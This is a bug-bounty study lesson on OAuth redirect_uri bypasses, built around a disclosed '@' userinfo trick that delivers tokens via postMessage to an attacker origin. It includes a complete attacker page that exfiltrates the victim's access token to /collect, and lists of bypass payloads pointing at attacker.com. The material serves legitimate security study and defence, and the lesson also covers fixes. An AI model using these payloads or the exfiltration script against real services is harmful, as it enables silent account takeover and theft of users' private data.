# Lesson 04 — OAuth: Redirect-URI Bypass → Token Theft → Account Takeover

> **Source material:** `naaaash.github.io/posts/oauth-redirect-bypass.html` (full 1-click ATO
> writeup), Ahmed Mahmoud's redirect-URI bypass vault, Innocenti et al. *"OAuth 2.0 Redirect URI
> Validation Falls Short, Literally"* (ACSAC 2023), RFC 9700 (OAuth 2.0 Security BCP, Mar 2025),
> CVE-2024-52289 (authentik), GitLab HackerOne #1613430 / #1725190, Meta `datr` chain ($24,000)
> **Format:** writeup → mechanism → raw traffic → bypasses → escalation → practice
> **Status:** Lesson 4 of the study track
> **Category:** 4. Identity & Auth — see [CURRICULUM](CURRICULUM.md#4-identity--auth)

---

## 1. The one-line definition

**`redirect_uri` tells the authorization server where to send the token. If you can make that
point at yourself, the victim's token becomes yours.**

OAuth doesn't leak *some* data. It leaks **the credential that represents the user** — a token
with the victim's full scope. One token = one account takeover, silently, with no password
needed and often no consent screen shown.

**The recurring insight:** OAuth bugs are rarely in the crypto. They're in **URL parsing
disagreements** — where the server and the browser disagree about what a URL *means*.

---

## 2. Real money from real OAuth reports

| Report | Program | Bounty | The bug |
|---|---|---|---|
| — | **Meta** | **$24,000** | `datr` device-identifier cookie extracted via **Graph API batch requests**, no user click; then trusted-device account recovery + secondary-verification bypass (Youssef Sammouda, Jan 2025) |
| — | (1-click ATO writeup) | — | **`@` userinfo bypass** of a strict allowlist → token via `postMessage` → full ATO (§4 below) |
| [#1613430](https://hackerone.com/reports/1613430) | GitLab | Disclosed | OAuth redirect weakness |
| [#1725190](https://hackerone.com/reports/1725190) | GitLab | Disclosed | OAuth redirect weakness |
| [CVE-2024-52289](https://securityblog.omegapoint.se/en/writeup-authentik-cve-2024-52289/) | authentik | — | Insecure redirect URI validation → **account takeover** |
| — | — | — | GitHub App scoped tokens → **$20,000** (see [Lesson 02 §2](02-GraphQL-BOLA.md)) — the token-scope cousin of this class |

**Two properties make OAuth the highest-paying web class:**

1. **The prize is a credential, not data.** You don't get one record — you get the identity.
2. **The bug is a parsing disagreement, not a broken check.** The server *has* a check. It uses
   the wrong method (string match) instead of the right one (parse, then compare).

**Study the academic work too — it's unusually good for this class:**
Innocenti et al. *"OAuth 2.0 Redirect URI Validation Falls Short, Literally"* (ACSAC 2023),
Wang et al. *"Make Redirection Evil Again — URL Parser Issues in OAuth"* (Black Hat Asia 2019),
and RFC 9700 (OAuth 2.0 Security BCP, Mar 2025) — deviations from it are findings.

---

## 3. Why OAuth out-pays almost everything else

The two highest-paying cases in our study corpus are both OAuth:
- **Meta `datr` cookie chain — $24,000** (Youssef Sammouda, Jan 2025): extracted Meta's device
  identifier via crafted Graph API batch requests, **no user click required**, then used it to
  trigger trusted-device account recovery and bypass secondary verification.
- **The `@` symbol 1-click ATO** (§4 below) — a single character bypassing a strict allowlist.

Compare the effort: one character. Compare the payout: full account takeover, silently.

Every OAuth implementation must validate this parameter. Mature ones use a strict allowlist.
This lesson is about how those allowlists break.

---

## 4. The `@` bypass — the whole story

### The setup

A large productivity platform (tens of millions of users) with an internal OAuth 2.0 server.
Tokens delivered back to the requesting page via **`postMessage`** — not a redirect.

### The allowlist held — for 40 payloads

The allowed `redirect_uri` for the first-party client was `app.example.com`. The researcher tried
everything:

```
redirect_uri=https://app.example.com.evil.com       → rejected
redirect_uri=https://evil.com/app.example.com        → rejected
redirect_uri=https://app.example.com%2e.evil.com     → rejected
redirect_uri=https://app.example.com/.evil.com       → rejected
```

Plus subdomain variations, path traversal, fragment injection, URL encoding, unicode
normalization, null bytes. **40+ payloads. All rejected.**

### Then: the 41st payload was one character

```
redirect_uri=https://app.example.com@attacker.com
```

**Accepted.**

### Why it works — RFC 3986 userinfo

Per RFC 3986, an HTTP URL has this structure:

```
https://userinfo@host:port/path
```

The **userinfo** component (everything before `@`) is valid syntax. The **host is whatever comes
after the `@`.**

So:
- A server doing **string matching** scans the string, finds `app.example.com`, says "looks good."
- The **actual host** — what the browser resolves and what receives the request — is
  **`attacker.com`**.

**The vulnerability is a disagreement about parsing, not a missing check.** The server had a
check. It just used the wrong method (string match) instead of the right one (parse then compare).

### The delivery mechanism — and why it's not "just an open redirect"

Critical nuance: **there was no 302.** No `Location` header pointing somewhere it shouldn't. If
you were hunting for a traditional redirect-based OAuth theft, **you would not find this.**

Instead the OAuth server returned an HTML page that stayed on its own origin and delivered the
token via `postMessage`:

```js
source.postMessage(
    '{"type":"auth","detail":{"access_token":"TOKEN_HERE"}}',
    "https://app.example.com@attacker.com"
);
window.close();
```

The **second argument is the target origin** — which window is allowed to receive the message.

**Browsers parse origins correctly.** When the browser sees `https://app.example.com@attacker.com`
as an origin, it **strips the userinfo** and resolves the origin as **`https://attacker.com`.**

So the token is delivered to any window with origin `https://attacker.com`. The attacker's popup
receives it.

> **The deep lesson:** `postMessage` target origins are parsed by the **browser**, not by your
> server. **If your server and the browser disagree about what a URL means, you have a bug.**

### Killing the consent screen

The endpoint supported **`mode=hidden`** — designed for silent token renewal when a session is
already active. With it set: **no consent screen.** No "Allow this app to access your data?"
dialog. Nothing.

Combined with the bypass: if the victim is logged in, the token is issued **and delivered
silently**. Zero interaction beyond the initial click.

### The full exploit

Attacker's page on `https://attacker.com`:

```js
window.addEventListener('message', function(event) {
    var data = JSON.parse(event.data);
    if (data.type === 'auth' && data.detail.access_token) {
        fetch('/collect', { method: 'POST', body: JSON.stringify(data.detail) });
    }
});

document.onclick = function() {
    window.open(
        'https://oauth.target.com/login?' +
        'client_id=FIRST_PARTY_CLIENT_ID' +
        '&redirect_uri=' + encodeURIComponent('https://app.example.com@attacker.com') +
        '&response_type=token' +
        '&scope=REDACTED' +
        '&mode=hidden'
    );
};
```

**Flow:**
1. Victim visits the page while logged in. Clicks anywhere.
2. Popup opens to the OAuth server. Server validates `redirect_uri`, **sees the trusted domain in
   the string**, accepts.
3. Server issues a token with **all requested scopes**, delivers via `postMessage` to
   `https://app.example.com@attacker.com` — which the browser resolves as `https://attacker.com`.
4. Attacker's `message` listener fires, exfiltrates the token.
5. **Popup auto-closes. The victim saw a window flash for under a second.**

### What the token unlocked

Issued with the **same privileges as the platform's own first-party client**:
- profile data
- **private messages**
- **stored files**
- connected services

> No rate limiting on the APIs accepting these tokens, and long enough lifetime to do serious
> damage before expiry. **One click = the same access as logging in as the victim.**

### The fix

1. **Reject any `redirect_uri` containing `@` in the authority component**
2. **Parse the URL properly** and validate the extracted hostname against the allowlist

Post-patch, the researcher retested **48 bypass variants** — all rejected. Solid fix.

---

## 5. The bypass taxonomy (root-cause organised)

The reason the `@` trick worked generalises. These are the root causes, not a payload dump:

### A. Domain confusion (userinfo & friends)

```
https://app.example.com@attacker.com          # userinfo trick — host is attacker.com
https://app.example.com%40attacker.com        # encoded @
https://attacker.com#app.example.com          # fragment confusion
https://attacker.com\.app.example.com         # backslash confusion (browsers normalise \ to /)
https://app.example.com.attacker.com          # suffix match on a naive "contains" check
https://appexample.com                        # prefix confusion
```

### B. Encoding layers

```
https://app.example.com%2f%2fattacker.com     # layered URL encoding
https://app.example.com%252eattacker.com      # double encoding
https://аpp.example.com                       # unicode look-alike (Cyrillic 'а')
https://app.example.com%E3%80%82attacker.com  # unicode full-stop normalisation
```

Source: **Birch, "HostSplit: Exploitable Antipatterns in Unicode Normalization"** (Black Hat USA
2019).

### C. Path confusion & parameter pollution

```
https://app.example.com/../attacker.com       # path traversal
https://app.example.com?next=https://attacker.com     # open redirect chained via allowlisted host
https://app.example.com/oauth/callback?redirect=https://attacker.com
redirect_uri=https://app.example.com&redirect_uri=https://attacker.com   # param pollution
```

### D. Open redirect chaining — the most reliable in practice

**The app validates correctly, then follows a 302 off an allowlisted domain.** The allowlist was
never the problem; the **redirect chain** was.

This is why **validating the initial URL string, on its own, is not enough.** You must re-resolve
and re-check after every redirect.

> Same principle as the SSRF lesson: string validation is defeated by indirection. Parse, resolve,
> then re-check after each hop.

---

## 6. Adjacent OAuth bugs worth hunting

| Class | The bug | Why it pays |
|---|---|---|
| **Missing `state` validation** | CSRF on the callback → attacker links *their* account to the victim's session (or vice versa) | Account takeover |
| **`state` not bound to session** | Same as above but subtler — `state` exists but isn't tied to the user | ATO |
| **Scope escalation** | Request a scope the client shouldn't have; server grants it | Privilege escalation |
| **PKCE downgrade** | Server accepts a request without `code_challenge` when it shouldn't | Interception |
| **Implicit flow `response_type=token`** | Token in the URL → leaks via referrer, history, logs | Token theft |
| **Token in fragment + `postMessage`** | Origin parsing disagreement (this lesson) | **Full ATO** |
| **`client_secret` in a public client** | Mobile/SPA app shipping the secret | Client impersonation |
| **Pre-account-takeover** | Register with victim's email before they sign up via OAuth | **ATO** |
| **Account linking without verification** | Link an unverified email to an existing account | **ATO** |
| **`redirect_uri` wildcard / prefix match** | `https://app.example.com*` accepts `https://app.example.com.attacker.com` | Token theft |
| **Brokered SSO chains** | Innocenti et al. IEEE S&P 2025 — the weakest link in a broker chain breaks all | ATO at scale |
| **OAuth connector account linking** | Luo et al. IEEE S&P 2026 — connector ecosystems | ATO |

**Real disclosed cases to study:** CVE-2024-52289 (authentik redirect bypass → ATO),
GitLab HackerOne [#1613430](https://hackerone.com/reports/1613430) and
[#1725190](https://hackerone.com/reports/1725190), GHSA-hhpq-7wg4-36jm (CakePHP).

---

## 7. The `postMessage` hunting technique — underused

Most hunters stop at "does `redirect_uri` bounce me off-domain?" **The `@` bug had no redirect
at all.** So add this to your method:

1. Find OAuth flows that deliver tokens via **`postMessage`** (SPAs, popup-based login)
2. Look at the **second argument** to `postMessage` — the target origin
3. Ask: **what URL is being passed as an origin, and does the browser parse it the same way the
   server does?**
4. Test userinfo (`@`), encoded variants, and any string that the server treats as "the trusted
   domain" but the browser resolves differently

**This class is invisible to redirect-based testing.** That's exactly why it pays.

---

## 8. How to test — methodology

```
01. Map every OAuth flow: authorization endpoint, client_id, redirect_uri, response_type,
    scope, state, PKCE params
02. Capture a full legitimate flow. Note the exact redirect_uri format and any query params
    the app appends (some apps append their own paths — that reveals the validation regex)
03. Test redirect_uri validation with the taxonomy:
      - exact match only? try suffix/prefix/subdomain
      - userinfo @ trick (the 41st payload)
      - encoded variants (%40, %2f, %252e)
      - path traversal, fragment, backslash
      - param pollution (two redirect_uri values)
      - wildcard/prefix regex abuse
04. Test whether validation happens at ALLOWLIST time or at REDIRECT time
    → find an open redirect on an allowlisted domain and chain it
05. Test `state`: omit it, replay an old one, use one from a different session
06. Test scope escalation: request broader scopes than the client should have
07. Test PKCE downgrade: remove code_challenge, send plain instead of S256
08. If tokens arrive via postMessage → test target-origin parsing (section 6)
09. Look for `mode=hidden` / silent flows — they remove the consent screen AND the user's
    chance to notice
10. Check first-party / internal client_ids — broader scopes, weaker restrictions
11. Confirm impact by USING the stolen token against a real API (prove access, don't just
    claim it)
12. Report with the exact payload, why the parser disagreed, and the fix (parse, don't match)
```

---

## 9. Common mistakes

- **Giving up after N rejected payloads.** The `@` bug was the **41st** attempt. Validation
  testing is combinatorial — persist.
- **Only testing for redirects.** The `@` bug had **no redirect**. Test `postMessage` origins too.
- **Assuming "strict allowlist" means safe.** Strict *string matching* is the vulnerability.
- **Not checking for `mode=hidden`.** Silent flows turn a redirect bug into a silent takeover.
- **Ignoring first-party client_ids.** They carry broader scopes and get less scrutiny.
- **Claiming ATO without using the token.** Prove access to a real API endpoint.
- **Forgetting `state`.** Half of OAuth ATOs are CSRF via missing/unbound `state`.
- **Not reading RFC 9700.** It's the current best-practice standard (March 2025) — deviations
  from it are findings.

---

## 10. Practice targets

| Target | Why |
|---|---|
| **PortSwigger OAuth labs** | the canonical progression — redirect bypass, implicit flow, `state`, SSRF in the flow |
| **Local Keycloak / authentik** | run it yourself; CVE-2024-52289 was an authentik redirect bypass |
| **Any SPA with popup-based login** | where `postMessage` token delivery lives |
| **Apps with "Sign in with X" + account linking** | pre-ATO and link-without-verification |
| **OAuth libraries themselves** | the *Cerberus* paper found 47 logic flaws in libraries — the library is a target |

**Assignment:** in the lab VM, stand up a local OAuth provider (Keycloak or authentik), register a
client with a strict allowlist, then work through the entire section-4 taxonomy against it —
recording which payload each defensive style rejects. Then build a small SPA that receives tokens
via `postMessage` and test the target-origin parsing with the `@` trick. That gives you both
halves of the lesson hands-on.

---

## 11. Key takeaways

1. **OAuth bugs are URL-parsing disagreements**, not crypto failures. String matching is the bug.
2. **The `@` userinfo trick is ancient and still ships.** Add it to every test suite.
3. **`postMessage` target origins are parsed by the browser.** Server/browser disagreement = ATO.
4. **The `@` bug had no redirect.** Expand your method beyond redirect hunting.
5. **`mode=hidden` removes the consent screen** — turning a redirect bug into a silent takeover.
6. **Open redirect on an allowlisted domain is the most reliable bypass.** Re-check after redirects.
7. **First-party client_ids are high-value** — broader scopes, weaker restrictions.
8. **Don't give up at 40.** The 41st payload might be one character.
9. **The fix is always: parse the URL, then validate the parsed hostname.** Never `contains()`.

---

## 12. What to study next

| You learned | Study next |
|---|---|
| `redirect_uri` bypass | **Open redirect as a standalone class** (it's the chain enabler) |
| `postMessage` origin parsing | DOM XSS via `postMessage` handlers |
| `state` CSRF | CSRF defence bypasses (SameSite, token binding) |
| Scope escalation | JWT claim tampering + `alg:none` / algorithm confusion |
| Pre-ATO | Account-linking abuse across multiple IdPs |

---

## 13. Reference index

| # | Source | Bounty | What it teaches |
|---|---|---|---|
| 1 | [naaaash: `@` → 1-click ATO](https://naaaash.github.io/posts/oauth-redirect-bypass.html) | — | full chain: userinfo bypass + postMessage + `mode=hidden` |
| 2 | [Ahmed Mahmoud: redirect_uri bypass vault](https://github.com/AhmedMahmoud-28/open-redirect-oauth-redirect-uri-bypass) | — | root-cause taxonomy + real cases |
| 3 | Innocenti et al., ACSAC 2023 | — | *Redirect URI Validation Falls Short, Literally* |
| 4 | Wang et al., Black Hat Asia 2019 | — | *Make Redirection Evil Again — URL Parser Issues in OAuth* |
| 5 | Birch, Black Hat USA 2019 | — | *HostSplit: Unicode Normalization Antipatterns* |
| 6 | Innocenti et al., IEEE S&P 2025 | — | Brokered SSO security |
| 7 | Luo et al., IEEE S&P 2026 | — | OAuth connector account linking |
| 8 | RFC 9700 (IETF, Mar 2025) | — | OAuth 2.0 Security Best Current Practice |
| 9 | [CVE-2024-52289](https://securityblog.omegapoint.se/en/writeup-authentik-cve-2024-52289/) | — | authentik redirect bypass → ATO |
| 10 | [GitLab #1613430](https://hackerone.com/reports/1613430) / [#1725190](https://hackerone.com/reports/1725190) | Disclosed | real OAuth findings |
| 11 | Meta `datr` chain (Sammouda, Jan 2025) | **$24,000** | API batch → device cookie → trusted-device recovery bypass |
